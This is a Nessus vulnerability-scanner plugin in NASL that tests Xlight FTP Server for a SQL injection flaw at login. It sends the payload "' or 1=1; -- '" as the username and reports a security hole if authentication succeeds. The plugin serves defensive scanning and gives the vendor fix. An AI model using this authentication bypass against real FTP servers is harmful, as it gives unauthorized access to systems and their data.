#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36051);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(34288);
  script_xref(name:"Secunia", value:"34513");
  script_xref(name:"OSVDB", value:"52997");

  script_name(english:"Xlight FTP Server Authentication SQL Injection Vulnerability");
  script_summary(english:"Tries to use SQL injection to login");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote FTP server is prone to a SQL injection attack."
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of Xlight FTP installed on the remote host is vulnerable to\n",
      "a SQL injection attack during login.  This allows an attacker to execute\n",
      "arbitrary SQL commands in the context of the FTP server.\n",
      "\n",
      "Installations that are not using external ODBC authentication are not\n",
      "affected by this vulnerability."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.xlightftpd.com/forum/viewtopic.php?t=1042"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.xlightftpd.com/whatsnew.htm"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to version 3.2.1 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("find_service2.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("global_settings.inc");
include("ftp_func.inc");

user = "' or 1=1; -- '";
pass = "nessus";

port = get_ftp_port(default:21);

# Unless we're paranoid, make sure the banner looks like Xlight
# before proceeding
if(report_paranoia < 2)
{
  banner = get_ftp_banner(port:port);

  if(!egrep(pattern:"xlight (ftp )?server", string:tolower(banner)))
    exit(0);
}

soc = open_sock_tcp(port);
if(!soc) exit(0);

if(ftp_authenticate(socket:soc, user:user, pass:pass))
{
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to log into the FTP server using the\n",
        "following credentials :\n\n",
        "  username : ", user, "\n",
        "  password : ", pass, "\n"
      );

      security_hole(port:port, extra:report);
    }
    else security_hole(port:port);
}

ftp_close(socket:soc);
